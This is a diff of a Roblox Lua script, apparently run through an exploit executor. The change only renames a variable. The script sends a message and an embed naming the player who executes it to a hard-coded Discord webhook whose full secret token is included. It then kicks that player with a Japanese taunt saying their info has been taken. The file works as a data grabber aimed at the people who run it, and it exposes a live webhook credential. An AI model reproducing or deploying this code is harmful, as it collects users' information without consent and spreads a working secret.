@@ -40,7 +40,7 @@ local gameURL = "https://www.roblox.com/games/" .. placeId
 local playerCount = Player:GetPlayers()
 
 -- // actual code and what not
-function SendMessage(url, message) -- // Send Message Function
+function SendMessage(urlhino, message) -- // Send Message Function
     local http = game:GetService("HttpService")
     local headers = {
         ["Content-Type"] = "application/json"
@@ -50,14 +50,14 @@ function SendMessage(url, message) -- // Send Message Function
     }
     local body = http:JSONEncode(data)
     local response = request({
-        Url = url,
+        Url = urlhino,
         Method = "POST",
         Headers = headers,
         Body = body
     })
     print("Sent Message")
 end
-function SendMessageEMBED(url, embed) -- // Send Embeded Message Function
+function SendMessageEMBED(urlhino, embed) -- // Send Embeded Message Function
     local http = game:GetService("HttpService")
     local headers = {
         ["Content-Type"] = "application/json"
@@ -77,7 +77,7 @@ function SendMessageEMBED(url, embed) -- // Send Embeded Message Function
     }
     local body = http:JSONEncode(data)
     local response = request({
-        Url = url,
+        Url = urlhino,
         Method = "POST",
         Headers = headers,
         Body = body
@@ -88,8 +88,8 @@ end
 
 -- // Examples 
 
-local url = "https://discord.com/api/webhooks/1363835529904263258/8YdNOM4WbVT8tzE5Vz5aQ3gHlX49iwoxOSKpZYIVPw7-HBGx82twD307fpA0WTPcdvlz" -- // WebHook Here
-SendMessage(url)
+local urlhino = "https://discord.com/api/webhooks/1363835529904263258/8YdNOM4WbVT8tzE5Vz5aQ3gHlX49iwoxOSKpZYIVPw7-HBGx82twD307fpA0WTPcdvlz" -- // WebHook Here
+SendMessage(urlhino)
 
 
 
@@ -108,7 +108,7 @@ local embed = {
         ["text"] = "executeした人: " .. game.Players.LocalPlayer.Name
     }
 }
-SendMessageEMBED(url, embed)
+SendMessageEMBED(urlhino, embed)
 
 player:Kick("おまえれいんじゃないやん、お前の情報もらったわ (^^ ありがとな" .. game.Players.LocalPlayer.Name)
 end
